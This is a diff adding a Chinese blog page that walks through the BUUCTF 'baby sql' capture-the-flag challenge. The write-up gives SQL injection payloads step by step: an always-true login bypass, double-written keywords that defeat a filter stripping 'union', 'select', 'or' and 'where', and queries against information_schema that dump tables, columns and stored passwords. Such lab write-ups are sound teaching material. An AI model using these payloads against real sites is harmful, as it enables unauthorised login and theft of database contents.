@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>17-buu练习baby sql | baba童鞋的博客</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="打开靶机：emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！先输入用户名和密码，看看什么反应。额…整一手万能密码：闭合双引号:?username&#x3D;admin&amp;password&#x3D;admin’ or ‘1’&#x3D;’1euuuuu报错了，说密码错误，那重新重新构造pyload：?username&#x3D;admin’&amp;password&#x3D;admin or">
+<meta property="og:type" content="article">
+<meta property="og:title" content="17-buu练习baby sql">
+<meta property="og:url" content="http://example.com/2021/01/31/baby/index.html">
+<meta property="og:site_name" content="baba童鞋的博客">
+<meta property="og:description" content="打开靶机：emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！先输入用户名和密码，看看什么反应。额…整一手万能密码：闭合双引号:?username&#x3D;admin&amp;password&#x3D;admin’ or ‘1’&#x3D;’1euuuuu报错了，说密码错误，那重新重新构造pyload：?username&#x3D;admin’&amp;password&#x3D;admin or">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby1.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby2.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby3.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby4.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby5.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby6.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby7.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby8.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby9.png">
+<meta property="og:image" content="http://example.com/2021/01/31/baby/baby10.gif">
+<meta property="article:published_time" content="2021-01-31T07:30:50.000Z">
+<meta property="article:modified_time" content="2021-01-31T08:04:00.495Z">
+<meta property="article:author" content="Jialu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/31/baby/baby1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/huahua.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/huahua.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-baby" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/31/baby/" class="article-date">
+  	<time datetime="2021-01-31T07:30:50.000Z" itemprop="datePublished">2021-01-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      17-buu练习baby sql
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开靶机：<br><img src="/2021/01/31/baby/baby1.png"><br>emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！<br>先输入用户名和密码，看看什么反应。<br><img src="/2021/01/31/baby/baby2.png"><br>额…整一手万能密码：闭合双引号:<br>?username=admin&amp;password=admin’ or ‘1’=’1<br><img src="/2021/01/31/baby/baby3.png"><br>euuuuu报错了，说密码错误，那重新重新构造pyload：<br>?username=admin’&amp;password=admin or ‘1’=’1<br>看看是否报错<br><img src="/2021/01/31/baby/baby4.png"><br>emmmm我们的or去哪里啦？于是进一步测试，发现过滤了好多关键字，比如or, select,where, union。应该是用函数replace给我们替换成了空白字符<br>知道了这样，我们就进行绕过，于是拼接字符，无法用order by 1来判断字段个数，我们只有使用联合查询看他是否能查出来，应该列数不太多，于是我们构造<br>pyload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2%23<br><img src="/2021/01/31/baby/baby5.png"><br>eeee应该是列数不对，再次构造payload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,3%23<br><img src="/2021/01/31/baby/baby6.png"><br>啊哈~对啦<br>可以看出有两个显示位：2和3<br>先查3的表：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23<br><img src="/2021/01/31/baby/baby7.png"><br>查出来两张表b4bsql和geekuser<br>爆表b4bsql字段：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=’b4bsql’%23<br><img src="/2021/01/31/baby/baby8.png"><br>查出三个列字段：id,username,password<br>最后查数据，当然是查密码了，flag就在里面，别问我为什么，问就是直觉！<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23<br><img src="/2021/01/31/baby/baby9.png"><br>成功得到flag！<br><img src="/2021/01/31/baby/baby10.gif"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/01/30/suibianzhu/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">16-buu练习[强网杯 2019]随便注</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="baby" data-title="17-buu练习baby sql" data-url="http://example.com/2021/01/31/baby/"  data-images="/img/huahua.jpg" data-content="17-buu练习baby sql">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 Jialu
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
